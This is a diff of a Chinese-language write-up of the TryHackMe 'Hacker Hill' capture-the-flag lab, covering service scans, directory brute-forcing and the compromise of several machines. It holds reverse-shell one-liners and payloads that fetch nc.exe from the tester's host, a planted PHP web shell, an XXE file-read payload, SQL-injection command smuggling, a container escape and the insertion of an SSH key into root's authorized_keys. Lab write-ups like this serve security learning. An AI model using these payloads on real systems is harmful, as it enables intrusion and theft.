@@ -1,9 +1,9 @@
-hackerhill# 免责声明
+# 免责声明
 >本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。
 
 # Easy Challenge
 
-# 服务发现
+## 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/hackerhill]
 └─# nmap -sV -Pn 10.10.134.251    
@@ -21,7 +21,7 @@ PORT     STATE SERVICE VERSION
 9999/tcp open  abyss?
 ```
 
-# 爆破8000端口的目录
+## 爆破8000端口的目录
 ```
 ──(root💀kali)-[~/dirsearch]
 └─# python3 dirsearch.py -e* -t 100 -u 10.10.134.251:8000
@@ -74,7 +74,7 @@ serv1
 
 然后第二个，第三个按照指示去到```/var/lib/rary```和```/var/www/serv4/index.php```起上面网站兑换指定flag
 
-# 提权
+## 提权
 传linpeas.sh，发现```/home/serv3/backups/backup.sh```这个定时任务是用root身份执行的，频率为一分钟一次
 
 查看bash文件权限
@@ -125,7 +125,7 @@ bash-4.4# cat /root/root.txt
 
 #  Medium Challenge
 
-# 服务发现
+## 服务发现
 
 ```
 ┌──(root💀kali)-[~/tryhackme/hackhill]
@@ -157,7 +157,7 @@ PORT     STATE SERVICE       VERSION
 
 80,81,82都是http服务，逐个爆破目录
 
-# 80
+## 80
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
 └─# python3 dirsearch.py -e* -t 100 -u http://10.10.48.179
@@ -188,7 +188,7 @@ Target: http://10.10.48.179/
 [10:12:45] 200 -    3KB - /signup 
 ```
 
-# 81
+## 81
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
 └─# python3 dirsearch.py -e* -t 100 -u http://10.10.48.179:81
@@ -213,7 +213,7 @@ Target: http://10.10.48.179:81/
 [10:28:32] 400 -   24B  - /ping     
 ```
 
-# 82
+## 82
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
 └─# python3 dirsearch.py -e* -t 100 -u http://10.10.48.179:82
@@ -256,7 +256,7 @@ Target: http://10.10.48.179:82/
 
 81端口看url```:81/ping?id=1```，测试了一下，存在sql注入，那么应该这个才是攻击点
 
-# 枚举数据库
+## 枚举数据库
 ```
 sqlmap -u "http://10.10.48.179:81/ping?id=1" -p "id"  --batch --dbms=mysql --technique B --dbs
 available databases [2]:
@@ -265,13 +265,13 @@ available databases [2]:
 
 ```
 
-# 其他信息
+## 其他信息
 >数据表：host 表字段：id,ip
 >用户名：monitor_read@localhot
 >密码：枚举不出来
 
 
-# getshell  
+## getshell  
 这个shell一直打不出来，这里参考大佬的方法
 在```http://10.10.48.179/profile```页面，用户名这个字段可以自由修改
 而且每次修改完，上传后的路径随即也会被改变
@@ -357,7 +357,7 @@ krbtgt                   patrocles
 
 传winPEASx64.exe枚举，几乎没有什么有用的信息 
 
-# 第二个shell
+## 第二个shell
 
 由于我们之前已经知道81端口存在一个sql注入，观察这个webapp的功能，如果我们能够改变host表ip这个字段的值，那么我们同样也可以利用命令行注入拿到另外一个shell
 
@@ -371,16 +371,16 @@ payload如下：
 
 由于我们现在已经可以注入命令，像前面那个shell一样我们把nc.exe传到靶机，然后再攻击机开启监听，拿到反弹shell
 
-## 传nc.exe
+### 传nc.exe
 ```id=9999 UNION SELECT NULL,CONCAT("|","powershell curl 10.13.21.169:8000/nc.exe -o nc.exe")-- -```
 
-## 本地监听
+### 本地监听
 ```nc -lnvp 4444```
 
-## 反弹
+### 反弹
 ```id=9999 UNION SELECT NULL,CONCAT("|","nc.exe 10.13.21.169 4444 -e powershell")-- -```
 
-## 拿shell
+### 拿shell
 ```
 ──(root💀kali)-[~/tryhackme/hackerhill]
 └─# nc -lnvp 4444
@@ -398,10 +398,10 @@ troy\helen
 
 在```C:\Users\helen\Desktop```拿到helen的flag
 
-# 第三个shell
+## 第三个shell
 82端口这个webapp的getshell非常的trick，以下解法参考了大佬的方法
 
-## 分析
+### 分析
 首先这是一个提交框，数据被提交到后台以后，在第二页的源代码注释会出现这样一行文字：
 >Ticket saved to ../tickets/
 
@@ -412,9 +412,9 @@ troy\helen
 经过测试Email Address这个字段可以接受双引号，邮箱格式结尾也允许```.php```
 
 因此我们的payload如下：
-*Email Address: "../public/"@admin.php*
-*Name:      <?php system($_GET['c']); ?\>*
-*Message:     <?php system($_GET['c']); ?\>*
+>Email Address: "../public/"@admin.php*
+>Name:      <?php system($_GET['c']); ?\>*
+>Message:     <?php system($_GET['c']); ?\>*
 
 
 上传以后显示：
@@ -428,19 +428,19 @@ troy\helen
 
 现在我们得到了一个简单的交互式shell
 
-## 传nc.exe
+### 传nc.exe
 ```http://10.10.48.179:82/@aaa.php?c=powershell curl 10.13.21.169:8000/nc.exe -o nc.exe```
 
 
-## 本地监听
+### 本地监听
 ```nc -lnvp 4445```
 
 
-## 反弹
+### 反弹
 ```http://10.10.48.179:82/@aaa.php?c=nc.exe 10.13.21.169 4445 -e powershell```
 
 
-## 拿shell
+### 拿shell
 ```
 ┌──(root💀kali)-[~/tryhackme/hackerhill]
 └─# nc -lnvp 4445
@@ -455,7 +455,7 @@ troy\hector
 
 在```C:\Users\hector\Desktop```拿到hector的flag
 
-# 提权
+## 提权
 把Rubeus.exe传到靶机
 ```
 PS C:\Users\hector\Desktop> powershell curl 10.13.21.169:8000/Rubeus.exe -o Rubeus.exe
@@ -541,10 +541,10 @@ nt authority\system
 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/hackerhill]
-└─# nmap -sV -Pn 10.10.83.126    
+└─# nmap -sV -Pn 10.10.243.173    
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-28 04:04 EDT
-Nmap scan report for 10.10.83.126
+Nmap scan report for 10.10.243.173
 Host is up (0.33s latency).
 Not shown: 993 closed ports
 PORT     STATE SERVICE VERSION
@@ -561,22 +561,206 @@ PORT     STATE SERVICE VERSION
 
 我们一个个查看。。。
 
+## 81端口
+目录爆破
+```
+┌──(root💀kali)-[~/tryhackme/dirsearch]
+└─# python3 dirsearch.py -u http://10.10.243.173:81/ -e* -t 100
+
+  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                             
+ (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                             
+Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
+
+Output File: /root/tryhackme/dirsearch/reports/10.10.243.173-81/-_21-10-28_08-54-57.txt
+
+Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_08-54-57.log
+
+Target: http://10.10.243.173:81/
+
+[08:54:59] Starting:  
+[08:55:40] 200 -  409KB - /access_log                                       
+[08:55:52] 301 -  178B  - /images  ->  http://10.10.243.173/images/          
+[08:55:52] 403 -  564B  - /images/                                          
+                                                                             
+Task Completed    
+```
+
+/access_log 第一个访问记录暴露一个文件夹```/s3cr3t_area```,打开是一张图片，感觉没啥有用的信息。
+
+
+
+
+## 82端口
+目录爆破
+```
+┌──(root💀kali)-[~/tryhackme/dirsearch]
+└─# python3 dirsearch.py -u http://10.10.243.173:82/ -e* -t 100           2 ⨯
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak
+HTTP method: GET | Threads: 100 | Wordlist size: 15492
+
+Output File: /root/tryhackme/dirsearch/reports/10.10.243.173-82/-_21-10-28_08-49-12.txt
+
+Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_08-49-12.log
+
+Target: http://10.10.243.173:82/
+
+[08:49:13] Starting: 
+[08:49:32] 400 -  304B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                                                                                            
+[08:50:35] 400 -  304B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                                                                                                                                                                      
+[08:50:50] 200 -   21B  - /feed                                                           
+[08:50:55] 301 -  316B  - /images  ->  http://10.10.243.173:82/images/                                                  
+[08:51:23] 200 -    2KB - /search                                                            
+[08:51:31] 301 -    0B  - /t  ->  /t/      
+```
+
+在```http://10.10.243.173:82/t/r/y/h/a/r/d/e/r/spamlog.log```找到信息
+>Nahamsec made me do it :(
+
+没卵用
+
+一个搜索框，在burpsuite上把搜索请求信息截取出来,保存到data2文件
+```
+└─# cat data2              
+POST /search HTTP/1.1
+Host: 10.10.243.173:82
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Origin: http://10.10.243.173:82
+Connection: close
+Referer: http://10.10.243.173:82/search
+Upgrade-Insecure-Requests: 1
+
+q=a
+
+```
+
+sqlmap测试证实存在sql注入，payload为：
+sqlmap -r data2 --level=5 --risk=3  --dbms=mysql 
+
+```
+  Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: q=1%' AND 3240=3240 AND 'UEDj%'='UEDj
+```
+
+枚举到的信息有：
+>数据库：hillpics
+>表：hill
+>当前用户：'hill'@'localhost'
+>密码：无法获取
+>当前用户角色和权限： USAGE （最低权限）
+>os-shell:无法获取
+其余没有什么有用的信息
+
+
+## 8888端口
+爆破目录
+```
+┌──(root💀kali)-[~/tryhackme/dirsearch]
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.243.173:8888
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak
+HTTP method: GET | Threads: 100 | Wordlist size: 15492
+
+Output File: /root/tryhackme/dirsearch/reports/10.10.243.173-8888/_21-10-28_09-36-47.txt
+
+Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_09-36-47.log
+
+Target: http://10.10.243.173:8888/
+
+[09:36:47] Starting: 
+[09:38:05] 200 -  135B  - /apps                                             
+[09:39:19] 200 -   45B  - /users                                            
+                                                                             
+Task Completed
+```
+/apps打印:
+```
+{"app1": {"name": "online file storage"}, "app2": {"name": "media player"}, "app3": {"name": "file sync"}, "app4": {"name": "/users"}}
+
+```
+
+
+/users打印：
+```
+{"user": {"davelarkin": "totallysecurehuh"}}
+
+```
+
+这里爆出了davelarkin的ssh登录凭证，通过2222端口拿到了flag4
+```
+┌──(root💀kali)-[~/.ssh]
+└─# ssh davelarkin@10.10.243.173 -p 2222                                                                                                                                                                                              255 ⨯
+The authenticity of host '[10.10.243.173]:2222 ([10.10.243.173]:2222)' can't be established.
+ECDSA key fingerprint is SHA256:D0vPRUo5EfUivVKiJf3i6JIOF50DxmKg/avxmu6bx4o.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.243.173]:2222' (ECDSA) to the list of known hosts.
+davelarkin@10.10.243.173's password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1037-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+davelarkin@a9ef0531077f:~$ whoami
+davelarkin
+davelarkin@a9ef0531077f:~$ ls
+api  bin  container4_flag.txt
+davelarkin@a9ef0531077f:~$ cat container4_flag.txt
+
+```
+
+传linpeas发现是在docker内
+
+
 ## 渗透80端口的http服务
 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.83.126                                                                      
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.243.173                                                                      
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/dirsearch/reports/10.10.83.126/_21-10-28_04-15-43.txt
+Output File: /root/dirsearch/reports/10.10.243.173/_21-10-28_04-15-43.txt
 
 Error Log: /root/dirsearch/logs/errors-21-10-28_04-15-43.log
 
-Target: http://10.10.83.126/
+Target: http://10.10.243.173/
 
 [04:15:44] Starting: 
                                        
@@ -618,21 +802,21 @@ login页面源代码显示，如果成功登录，将被导向一个token页面,
 
 看样子像是一个servermanager数据库的登陆页面。不知道用户名
 
-继续对/api/user爆破
+继续对```/api/user```爆破
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.83.126/api/user
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.243.173/api/user
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/tryhackme/dirsearch/reports/10.10.83.126/-api-user_21-10-28_09-49-39.txt
+Output File: /root/tryhackme/dirsearch/reports/10.10.243.173/-api-user_21-10-28_09-49-39.txt
 
 Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_09-49-39.log
 
-Target: http://10.10.83.126/api/user/
+Target: http://10.10.243.173/api/user/
 
 [09:49:41] Starting: 
 [09:51:22] 200 -   53B  - /api/user/login                                   
@@ -654,154 +838,185 @@ Target: http://10.10.83.126/api/user/
 what the fuck....
 
 这串古怪的符号和youtube上的这个视频的id居然一样：
->https://www.youtube.com/watch?v=dQw4w9WgXcQ
- 视频是Rick Astley - Never Gonna Give You Up (Official Music Video)，不知道是作者在叫我不要放弃还是有什么提示。。。
+视频是[Rick Astley - Never Gonna Give You Up (Official Music Video)](https://www.youtube.com/watch?v=dQw4w9WgXcQ)，不知道是作者在叫我不要放弃还是有什么提示。。。
 
 
-hydra -f -V -l admin -P /usr/share/wordlists/rockyou.txt 10.10.83.126 http-post-form "/api/user/login:username=^USER^&password=^PASS^&Login=Login:Invalid username"
+爆破admin账号不成功，sql注入也没有结果。在我经验范围内，我已经用尽了所有方法，所以这个时候我只能看大佬walkthrough了： ）
 
-davelarkin
+原来是在burpsuite里用xml注入
 
-hydra -f -V -l davelarkin -P /usr/share/wordlists/rockyou.txt 10.10.83.126 ssh
-
-
-sqlmap -r data --technique T --level=5 --risk=3 --dbms=mysql -p "password"
-
-
-
-# 81端口
-目录爆破
+payload
 ```
-┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -u http://10.10.83.126:81/ -e* -t 100
-
-  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                             
- (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
-                                                                                                                                                                                                                                             
-Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
-
-Output File: /root/tryhackme/dirsearch/reports/10.10.83.126-81/-_21-10-28_08-54-57.txt
-
-Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_08-54-57.log
-
-Target: http://10.10.83.126:81/
-
-[08:54:59] Starting:  
-[08:55:40] 200 -  409KB - /access_log                                       
-[08:55:52] 301 -  178B  - /images  ->  http://10.10.83.126/images/          
-[08:55:52] 403 -  564B  - /images/                                          
-                                                                             
-Task Completed    
-```
-
-/access_log 第一个访问记录暴露一个文件夹```/s3cr3t_area```,打开是一张图片，下载到本地后用binwalk发现有zlib文件
-
-
-
-
-# 82端口
-目录爆破
-```
-┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -u http://10.10.83.126:82/ -e* -t 100           2 ⨯
-
-  _|. _ _  _  _  _ _|_    v0.4.2
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak
-HTTP method: GET | Threads: 100 | Wordlist size: 15492
-
-Output File: /root/tryhackme/dirsearch/reports/10.10.83.126-82/-_21-10-28_08-49-12.txt
-
-Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_08-49-12.log
-
-Target: http://10.10.83.126:82/
-
-[08:49:13] Starting: 
-[08:49:32] 400 -  304B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                                                                                            
-[08:50:35] 400 -  304B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                                                                                                                                                                      
-[08:50:50] 200 -   21B  - /feed                                                           
-[08:50:55] 301 -  316B  - /images  ->  http://10.10.83.126:82/images/                                                  
-[08:51:23] 200 -    2KB - /search                                                            
-[08:51:31] 301 -    0B  - /t  ->  /t/      
-```
-
-在```http://10.10.83.126:82/t/r/y/h/a/r/d/e/r/spamlog.log```找到信息
->Nahamsec made me do it :(
-
-一个搜索框，在burpsuite上把搜索请求信息截取出来,保存到data2文件
-```
-└─# cat data2              
-POST /search HTTP/1.1
-Host: 10.10.83.126:82
+GET /api/user?xml HTTP/1.1
+Host: 10.10.243.173
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 3
-Origin: http://10.10.83.126:82
 Connection: close
-Referer: http://10.10.83.126:82/search
 Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Length: 148
 
-q=a
+
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
+<foo><id>&ac;</id></foo>
+```
+
+返回了index.php的base64密文，解出来是：
+```
+<?php
+include_once('../Autoload.php');
+include_once('../Route.php');
+include_once('../Output.php');
+include_once('../View.php');
+
+Route::load();
+Route::run();
+```
+
+最后在```../controllers/Api.php```找到admin的登录凭证：niceWorkHackerm4n
+
+登录进去后在靶机提供的webshell栏写payload:
+```
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.21.169",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+```
+
+收到反弹shell
+```
+└─# nc -lnvp 4242
+listening on [any] 4242 ...
+connect to [10.13.21.169] from (UNKNOWN) [10.10.243.173] 59426
+$ ls
+ls
+bootstrap.min.css  bootstrap.min.js  index.php  jquery.min.js  script.js
 
 ```
 
-sqlmap测试证实存在sql注入，payload为：
-sqlmap -r data2 --level=5 --risk=3  --dbms=mysql 
+查看```/etc/passwd```我们知道admin是系统里的期中一个用户，由于我们已经知道admin的密码，这个时候本来可以直接su admin
+然而这个系统并没有su 命令，这个时候可以使用ssh来转换角色
 
+>ssh admin@localhost sh
 ```
-  Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: q=1%' AND 3240=3240 AND 'UEDj%'='UEDj
+www-data@6b364d3940e6:/var/www/html/public$ ssh admin@localhost sh
+ssh admin@localhost sh
+admin@localhost's password: 
+id
+uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)
+whoami
+admin
 ```
 
-枚举到的信息有：
-数据库：hillpics
-表：hill
-当前用户：'hill'@'localhost'
-密码：无法获取
-当前用户角色和权限： USAGE （最低权限）
-os-shell:无法获取
-
-
-
-# 8888端口
-爆破目录
+这个时候不要切换成tty，用sudo -l查看admin的超级权限，发现可以用/usr/bin/nsenter
 ```
-┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.83.126:8888
+sudo -l
+Matching Defaults entries for admin on 6b364d3940e6:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-  _|. _ _  _  _  _ _|_    v0.4.2
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak
-HTTP method: GET | Threads: 100 | Wordlist size: 15492
-
-Output File: /root/tryhackme/dirsearch/reports/10.10.83.126-8888/_21-10-28_09-36-47.txt
-
-Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_09-36-47.log
-
-Target: http://10.10.83.126:8888/
-
-[09:36:47] Starting: 
-[09:38:05] 200 -  135B  - /apps                                             
-[09:39:19] 200 -   45B  - /users                                            
-                                                                             
-Task Completed
-```
-/apps打印:
-```
-{"app1": {"name": "online file storage"}, "app2": {"name": "media player"}, "app3": {"name": "file sync"}, "app4": {"name": "/users"}}
+User admin may run the following commands on 6b364d3940e6:
+    (ALL) ALL
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /usr/bin/nsenter
 
 ```
 
-
-/users打印：
+直接提权到root
 ```
-{"user": {"davelarkin": "totallysecurehuh"}}
+sudo /usr/bin/nsenter /bin/sh
+id
+id
+uid=0(root) gid=0(root) groups=0(root)
 
 ```
+
+去```/root/container1_flag.txt```拿flag
+
+## 提权
+
+用```fdisk -l```命令打印发现```/dev/xvda1```这个分区应该是主机的分区
+
+我们把它挂载到当前docker镜像的```/mnt/compromise```下面:
+
+```
+mkdir -p /mnt/compromise
+mount /dev/xvda1 /mnt/compromise
+```
+
+
+在```/mnt/compromise/root```  拿到 root flag
+
+
+把攻击机的公钥追加到靶机的authorized_keys
+```
+echo "ssh-rsa *************" >> /mnt/compromise/root/.ssh/authorized_keys
+```
+
+root身份登录靶机
+```
+┌──(root💀kali)-[~/tryhackme/hackerhill]
+└─# ssh  root@10.10.243.173 -p 22                                                                                                                                                                                                     255 ⨯
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-1037-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Oct 29 08:25:38 UTC 2021
+
+  System load:                      0.04
+  Usage of /:                       88.8% of 7.69GB
+  Memory usage:                     72%
+  Swap usage:                       37%
+  Processes:                        205
+  Users logged in:                  0
+  IPv4 address for br-9c1efeb291f3: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.243.173
+
+  => / is using 88.8% of 7.69GB
+
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+root@ip-10-10-243-173:~# cat /var/www/container2_flag.txt
+cat: /var/www/container2_flag.txt: No such file or directory
+root@ip-10-10-243-173:~# whoami
+root
+```
+
+
+全局查找flag2
+```
+root@ip-10-10-243-173:/# find / -name container2_flag.txt
+find: ‘/proc/27811’: No such file or directory
+/var/lib/docker/overlay2/fb80a052499ad52a2df535ce669f4cca3b02009c751ab47752374a566ec61667/diff/var/www/container2_flag.txt
+/var/lib/docker/overlay2/7149ee32cde09f7439cc3588b5f757bd6b16aaaccb59f8cf3291e8d6dc6c05db/merged/var/www/container2_flag.txt
+```
+
+
+全局查找flag3
+```
+root@ip-10-10-243-173:/# find / -name container3_flag.txt
+find: ‘/proc/28025/task/28025/net’: Invalid argument
+find: ‘/proc/28025/net’: Invalid argument
+/var/lib/docker/overlay2/d38650b56ff4bbca92fe794176a3394bd05fc9d55d87341b1c0d2a54b5ae1c03/merged/home/container3_flag.txt
+/var/lib/docker/overlay2/5bfb136d474f285a5a6133918e11acd8212b7559b33494e11e8c72fbe7e2f6c6/diff/home/container3_flag.txt
+```
+
 
